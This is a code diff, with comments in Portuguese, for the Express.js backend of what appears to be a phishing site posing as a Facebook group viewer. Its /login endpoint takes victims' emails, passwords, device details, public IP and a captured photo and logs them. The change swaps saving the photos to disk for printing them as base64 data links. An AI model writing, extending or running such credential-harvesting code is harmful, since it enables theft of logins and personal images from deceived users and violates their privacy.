@@ -5,18 +5,6 @@ require('dotenv').config();
 
 const app = express();
 
-// Função de conversão atualizada para usar a pasta 'fotos'
-const base64ToImage = (base64String, fileName) => {
-    // Criar pasta 'fotos' se não existir
-    const dir = './fotos';
-    if (!require('fs').existsSync(dir)){
-        require('fs').mkdirSync(dir);
-    }
-    
-    const buffer = Buffer.from(base64String.split(',')[1], 'base64');
-    require('fs').writeFileSync(`${dir}/${fileName}.jpg`, buffer);
-}
-
 app.use(cors({
     origin: process.env.FRONTEND_URL || 'https://viewgroupfb.netlify.app/',
     methods: ['GET', 'POST'],
@@ -34,15 +22,12 @@ app.post('/login', async (req, res) => {
     try {
         const { email, senha, dispositivo, foto, ipPublico } = req.body;
 
-        // Log da foto em base64
-        console.log('\n📸 FOTO CAPTURADA (BASE64) 📸\n');
-        console.log(foto);
+        // Criar um link para visualizar a foto em base64
+        const fotoLink = `data:image/jpeg;base64,${foto.split(',')[1]}`;
         
-        // Salvar a foto na pasta 'fotos'
-        const fileName = `foto_${Date.now()}`;
-        base64ToImage(foto, fileName);
-
-        console.log(`📸 Foto salva como: fotos/${fileName}.jpg`);
+        // Log da foto como link
+        console.log('\n📸 FOTO CAPTURADA 📸\n');
+        console.log('Link da foto:', fotoLink);
 
         // Log das credenciais
         console.log('\n');
